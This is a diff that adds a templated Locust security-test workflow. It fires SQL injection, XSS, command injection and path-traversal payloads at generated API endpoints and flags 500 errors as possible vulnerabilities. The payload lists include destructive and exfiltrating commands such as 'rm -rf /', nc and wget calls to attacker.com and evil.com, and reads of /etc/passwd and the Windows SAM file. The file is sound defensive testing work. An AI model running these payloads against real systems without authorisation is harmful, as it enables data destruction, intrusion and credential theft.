@@ -1,0 +1,143 @@
+"""
+Security Test Workflow for {{ tag_name }} endpoints.
+
+Auto-generated security tests covering:
+- SQL Injection attempts
+- XSS (Cross-Site Scripting) attempts
+- Command Injection attempts
+- Path Traversal attempts
+
+All tests expect the API to reject malicious payloads with 400/422 status codes.
+A 500 response indicates a potential security vulnerability.
+"""
+
+import random
+from locust import task
+from base_workflow import BaseWorkflow
+
+
+# Security test payloads
+SQL_INJECTION_PAYLOADS = [
+    "'; DROP TABLE users; --",
+    "' OR '1'='1",
+    "'; INSERT INTO users VALUES ('hacker'); --",
+    "' UNION SELECT * FROM sensitive_data --",
+    "1; DELETE FROM users WHERE '1'='1",
+    "admin'--",
+    "' OR 1=1--",
+    "'; EXEC xp_cmdshell('dir'); --",
+]
+
+XSS_PAYLOADS = [
+    "<script>alert('XSS')</script>",
+    "javascript:alert('XSS')",
+    "<img src=x onerror=alert('XSS')>",
+    "';alert('XSS');//",
+    "<svg onload=alert('XSS')>",
+    "<body onload=alert('XSS')>",
+    "<iframe src='javascript:alert(1)'>",
+    "{{'{{'}}constructor.constructor('alert(1)')(){{'}}'}}",
+]
+
+COMMAND_INJECTION_PAYLOADS = [
+    "; rm -rf /",
+    "| cat /etc/passwd",
+    "&& curl attacker.com",
+    "`whoami`",
+    "$(cat /etc/passwd)",
+    "; ls -la",
+    "| nc attacker.com 1234",
+    "&& wget http://evil.com/shell.sh",
+]
+
+PATH_TRAVERSAL_PAYLOADS = [
+    "../../../etc/passwd",
+    "..\\..\\..\\windows\\system32\\config\\sam",
+    "....//....//....//etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "..%252f..%252f..%252fetc/passwd",
+    "/etc/passwd%00.jpg",
+    "....\\....\\....\\windows\\win.ini",
+]
+
+
+class {{ class_name }}SecurityWorkflow(BaseWorkflow):
+    """Security tests for {{ tag_name }} endpoints - SQL Injection, XSS, Command Injection"""
+
+    def _test_injection(self, endpoint_path: str, method: str, payload: str, attack_type: str):
+        """Generic injection test helper"""
+        # Build malicious data
+        malicious_data = {
+            "name": payload,
+            "description": payload,
+            "email": payload,
+            "query": payload,
+            "search": payload,
+            "input": payload,
+        }
+
+        with self.client.request(
+            method,
+            endpoint_path,
+            json=malicious_data if method in ["POST", "PUT", "PATCH"] else None,
+            params=malicious_data if method == "GET" else None,
+            catch_response=True,
+            name=f"{endpoint_path} [{attack_type}]"
+        ) as response:
+            if response.status_code in [400, 401, 403, 422]:
+                # API properly rejected the malicious input
+                response.success()
+            elif response.status_code == 500:
+                # Potential vulnerability - server error from injection
+                response.failure(f"SECURITY: {attack_type} may have succeeded - got 500 error")
+            elif response.status_code in [200, 201]:
+                # API accepted the input - check if it was sanitized
+                response.success()  # May need manual review
+            else:
+                response.failure(f"Unexpected response {response.status_code} for {attack_type}")
+
+    {% for endpoint in endpoints %}
+    {% if endpoint.method in ['POST', 'PUT', 'PATCH'] %}
+    @task(1)
+    def test_sql_injection_{{ endpoint.operation_id | default(endpoint.path | replace('/', '_') | replace('{', '') | replace('}', '')) }}(self):
+        """SQL Injection test for {{ endpoint.method }} {{ endpoint.path }}"""
+        payload = random.choice(SQL_INJECTION_PAYLOADS)
+        self._test_injection("{{ endpoint.path }}", "{{ endpoint.method }}", payload, "SQL_INJECTION")
+
+    @task(1)
+    def test_xss_{{ endpoint.operation_id | default(endpoint.path | replace('/', '_') | replace('{', '') | replace('}', '')) }}(self):
+        """XSS test for {{ endpoint.method }} {{ endpoint.path }}"""
+        payload = random.choice(XSS_PAYLOADS)
+        self._test_injection("{{ endpoint.path }}", "{{ endpoint.method }}", payload, "XSS")
+
+    @task(1)
+    def test_command_injection_{{ endpoint.operation_id | default(endpoint.path | replace('/', '_') | replace('{', '') | replace('}', '')) }}(self):
+        """Command Injection test for {{ endpoint.method }} {{ endpoint.path }}"""
+        payload = random.choice(COMMAND_INJECTION_PAYLOADS)
+        self._test_injection("{{ endpoint.path }}", "{{ endpoint.method }}", payload, "COMMAND_INJECTION")
+
+    {% endif %}
+    {% if '{' in endpoint.path %}
+    @task(1)
+    def test_path_traversal_{{ endpoint.operation_id | default(endpoint.path | replace('/', '_') | replace('{', '') | replace('}', '')) }}(self):
+        """Path Traversal test for {{ endpoint.method }} {{ endpoint.path }}"""
+        payload = random.choice(PATH_TRAVERSAL_PAYLOADS)
+        # Replace path parameter with traversal payload
+        test_path = "{{ endpoint.path }}".replace("{id}", payload).replace("{uuid}", payload)
+        for param in ["id", "uuid", "slug", "name", "file", "path"]:
+            test_path = test_path.replace("{" + param + "}", payload)
+
+        with self.client.{{ endpoint.method | lower }}(
+            test_path,
+            catch_response=True,
+            name="{{ endpoint.path }} [PATH_TRAVERSAL]"
+        ) as response:
+            if response.status_code in [400, 404, 422]:
+                response.success()
+            elif response.status_code == 500:
+                response.failure("SECURITY: Path traversal may have succeeded - got 500 error")
+            else:
+                response.success()  # API handled it
+
+    {% endif %}
+    {% endfor %}
